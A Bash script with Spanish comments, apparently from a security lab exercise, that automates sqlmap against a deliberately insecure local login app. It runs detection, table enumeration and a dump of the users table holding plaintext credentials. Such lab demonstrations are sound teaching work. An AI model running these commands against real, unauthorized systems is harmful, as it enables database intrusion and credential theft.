#!/usr/bin/env bash
#
# Fase 3 - Automatización de SQL Injection con sqlmap contra v1-insecure.
#
# Explota el login vulnerable (OWASP A03:2021 - Injection) y extrae las
# credenciales almacenadas en la base de datos, demostrando el impacto de
# construir queries por concatenación de strings.
#
# Uso:
#   ./automate_sqlmap.sh [URL_BASE]   (por defecto: http://localhost:5000)
#
# Requisitos:
#   - v1-insecure corriendo (python run.py)
#   - sqlmap instalado (apt install sqlmap)
set -euo pipefail

TARGET="${1:-http://localhost:5000}"
LOGIN_URL="${TARGET}/login"
DATA="username=admin&password=admin123"
OUTDIR="$(dirname "$0")/output"
TS="$(date +%Y%m%d_%H%M%S)"
LOG="${OUTDIR}/sqlmap_${TS}.log"

mkdir -p "${OUTDIR}"

echo "[*] Target:        ${TARGET}"
echo "[*] Endpoint:      POST ${LOGIN_URL}"
echo "[*] Salida:        ${LOG}"
echo

# 1) DETECCIÓN: identifica el tipo y parámetro vulnerable (boolean/time-based).
echo "[1/3] Detectando SQL injection en el login..."
sqlmap -u "${LOGIN_URL}" --data "${DATA}" \
    --batch --level=1 --risk=1 \
    --flush-session 2>&1 | tee -a "${LOG}"

# 2) ENUMERACIÓN: listado de tablas de la base de datos.
echo "[2/3] Enumerando tablas de la base de datos..."
sqlmap -u "${LOGIN_URL}" --data "${DATA}" \
    --batch --tables 2>&1 | tee -a "${LOG}"

# 3) EXTRACCIÓN: volcado de la tabla users (credenciales en texto plano).
echo "[3/3] Extrayendo credenciales (tabla users)..."
sqlmap -u "${LOGIN_URL}" --data "${DATA}" \
    --batch --dump -T users 2>&1 | tee -a "${LOG}"

echo
echo "[*] Listo. Resultados en ${LOG}"
echo "    (copia CSV: ~/.local/share/sqlmap/output/localhost/dump/)"
